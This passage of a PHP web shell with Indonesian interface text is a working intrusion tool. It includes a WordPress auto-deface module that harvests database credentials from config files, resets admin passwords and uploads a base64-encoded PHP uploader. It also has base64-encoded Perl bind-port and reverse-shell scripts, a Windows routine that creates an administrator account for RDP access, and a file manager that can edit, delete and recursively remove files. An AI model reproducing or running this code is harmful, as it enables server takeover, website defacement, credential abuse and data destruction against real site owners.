			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "global";
		$pass = "global";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=lime>$user</font><br>";
            	        echo "[+] password: <font color=lime>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Crystalesia' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['do'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user global");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>global</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='global' required>
			<input type='text' name='pass' placeholder='password' value='global' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>could not remove ".basename($dir)."</font>";
		}
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
		}
}
?>